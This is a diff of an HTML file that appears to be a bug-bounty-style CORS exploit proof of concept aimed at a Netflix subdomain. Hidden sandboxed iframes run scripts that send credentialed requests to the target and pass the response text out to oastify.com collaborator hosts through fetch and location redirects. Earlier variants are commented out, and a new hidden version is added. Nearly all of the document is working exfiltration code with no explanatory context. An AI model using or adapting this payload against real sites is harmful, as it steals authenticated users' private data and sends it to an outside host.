@@ -23,7 +23,7 @@ function reqListener() {
 location='https://waad1889kvixjwhtgb01sd44dvjm7dv2.oastify.com/log?key='+this.responseText;
 };
 </script>"></iframe>
-</script> -->
+</script> 
 
 
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
@@ -35,4 +35,31 @@ location='https://waad1889kvixjwhtgb01sd44dvjm7dv2.oastify.com/log?key='+this.re
     function reqListener() {
         location='4w18pv4n5o49fmy45czp5tt6mxsoge43.oastify.com/log?key='+encodeURIComponent(this.responseText);
     };
-</script>"></iframe>
+</script>"></iframe> -->
+
+<html>
+    <body>
+
+        <iframe style="display: none;" sandbox="allow-scripts" srcdoc="
+<script>
+            var xhr = new XMLHttpRequest();
+            var url = 'https://www.ichnaea-web.netflix.com'
+
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState == XMLHttpRequest.DONE) {
+                fetch('https://4w18pv4n5o49fmy45czp5tt6mxsoge43.oastify.com/log?key=' + xhr.responseText)
+            }
+        }
+        xhr.open('GET', url + '/log', true);
+        xhr.withCredentials = true;
+        xhr.send(null);
+    </script>"></iframe>
+</body>
+</html>
+
+
+
+
+
+
+
